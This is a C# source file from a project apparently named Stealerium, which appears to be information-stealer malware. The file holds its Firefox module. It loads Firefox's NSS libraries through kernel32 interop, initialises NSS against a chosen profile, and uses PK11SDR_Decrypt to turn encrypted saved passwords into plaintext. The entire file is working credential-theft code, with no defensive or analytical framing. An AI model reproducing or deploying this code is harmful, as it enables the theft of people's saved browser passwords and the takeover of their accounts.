using System;
using System.Runtime.InteropServices;
using System.Text;
using Stealerium.Helpers;

namespace Stealerium.Target.Browsers.Firefox
{
    internal sealed class WinApi
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr LoadLibrary(string sFileName);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        internal static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        internal static extern IntPtr GetProcAddress(IntPtr hModule, string sProcName);
    }

    internal sealed class Nss3
    {
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssInit(string sDirectory);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long NssShutdown();

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int Pk11SdrDecrypt(ref TsecItem tsData, ref TsecItem tsResult, int iContent);

        public struct TsecItem
        {
            public int SecItemType;
            public IntPtr SecItemData;
            public int SecItemLen;
        }
    }

    internal class Decryptor
    {
        private static IntPtr _hNss3;
        private static IntPtr _hMozGlue;

        private static Nss3.NssInit _fpNssInit;
        private static Nss3.Pk11SdrDecrypt _fpPk11SdrDecrypt;
        private static Nss3.NssShutdown _fpNssShutdown;

        public static bool LoadNss(string sPath)
        {
            try
            {
                _hMozGlue = WinApi.LoadLibrary(sPath + "\\mozglue.dll");
                _hNss3 = WinApi.LoadLibrary(sPath + "\\nss3.dll");

                var ipNssInitAddr = WinApi.GetProcAddress(_hNss3, "NSS_Init");
                var ipNssPk11SdrDecrypt = WinApi.GetProcAddress(_hNss3, "PK11SDR_Decrypt");
                var ipNssShutdown = WinApi.GetProcAddress(_hNss3, "NSS_Shutdown");

                _fpNssInit = (Nss3.NssInit) Marshal.GetDelegateForFunctionPointer(ipNssInitAddr, typeof(Nss3.NssInit));
                _fpPk11SdrDecrypt =
                    (Nss3.Pk11SdrDecrypt) Marshal.GetDelegateForFunctionPointer(ipNssPk11SdrDecrypt,
                        typeof(Nss3.Pk11SdrDecrypt));
                _fpNssShutdown =
                    (Nss3.NssShutdown) Marshal.GetDelegateForFunctionPointer(ipNssShutdown, typeof(Nss3.NssShutdown));

                return true;
            }
            catch (Exception ex)
            {
                Logging.Log("Firefox decryptor >> Failed to load NSS\n" + ex);
                return false;
            }
        }

        public static void UnLoadNss()
        {
            _fpNssShutdown();
            WinApi.FreeLibrary(_hNss3);
            WinApi.FreeLibrary(_hMozGlue);
        }

        public static bool SetProfile(string sProfile)
        {
            return _fpNssInit(sProfile) == 0;
        }

        public static string DecryptPassword(string sEncPass)
        {
            var lpMemory = IntPtr.Zero;

            try
            {
                var bPassDecoded = Convert.FromBase64String(sEncPass);

                lpMemory = Marshal.AllocHGlobal(bPassDecoded.Length);
                Marshal.Copy(bPassDecoded, 0, lpMemory, bPassDecoded.Length);

                var tsiOut = new Nss3.TsecItem();
                var tsiItem = new Nss3.TsecItem
                {
                    SecItemType = 0,
                    SecItemData = lpMemory,
                    SecItemLen = bPassDecoded.Length
                };

                if (_fpPk11SdrDecrypt(ref tsiItem, ref tsiOut, 0) == 0)
                    if (tsiOut.SecItemLen != 0)
                    {
                        var bDecrypted = new byte[tsiOut.SecItemLen];
                        Marshal.Copy(tsiOut.SecItemData, bDecrypted, 0, tsiOut.SecItemLen);

                        return Encoding.UTF8.GetString(bDecrypted);
                    }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
                return null;
            }
            finally
            {
                if (lpMemory != IntPtr.Zero)
                    Marshal.FreeHGlobal(lpMemory);
            }

            return null;
        }
    }
}